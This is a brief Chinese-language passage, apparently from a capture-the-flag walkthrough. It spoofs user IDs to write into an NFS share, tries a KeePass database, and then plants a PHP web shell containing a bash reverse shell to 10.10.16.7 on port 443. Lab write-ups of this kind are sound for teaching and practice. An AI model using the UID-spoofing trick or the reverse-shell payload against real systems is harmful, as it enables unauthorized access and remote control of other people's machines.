    先看一下 NFS 目录权限

    sudo useradd -u 1001 ross
sudo su ross
mkdir /mnt/ross/.ssh

    文件系统无法写入，尝试解密 keepass 数据库

    估计是加了密钥文件，那么再看一下 Web 目录

    反弹 Shell

    sudo useradd -u 2017 www -s /bin/bash
sudo su www

    可以看到这里是可以解析 .html 文件中的 php 语句的，不过这里可以写入，直接写入 php 文件

    echo "<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1'\");?>" > rev.php
